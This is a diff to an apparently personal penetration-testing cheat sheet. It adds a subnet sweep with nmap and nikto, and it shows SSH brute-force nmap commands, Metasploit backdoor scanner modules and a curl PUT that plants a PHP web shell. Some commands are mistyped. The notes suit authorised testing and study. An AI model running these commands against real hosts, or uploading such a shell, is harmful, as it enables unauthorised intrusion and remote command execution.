@@ -25,7 +25,17 @@
     nmap -p 22 -n -v -sV  -sC -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
     nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
     nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
-    
+   #### Nmap advanced clevest scan
+   ```` 
+     ipcalc 192.168.0.48  
+     nmap -p 80 192.168.0.0/24 -oG nullbyte.txt
+     
+     #filtering only open ports
+     cat nullbyte.txt | awk '/Up$/{print $2}' | cat >> targetIP.txt
+     # Scanning all ip addresses 
+     nikto -h targetIP.txt
+     nmap -il targetIP.txt
+   
 ### Metasploit Modules for SSH service
     auxiliary/scanner/ssh/fortinet_backdoor
     auxiliary/scanner/ssh/juniper_backdoor
@@ -71,6 +81,7 @@
     
 ## port 80 
 ### Enumeratng port 80
+  
     nikto -h http://192.168.1.10/
     curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php
     sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql
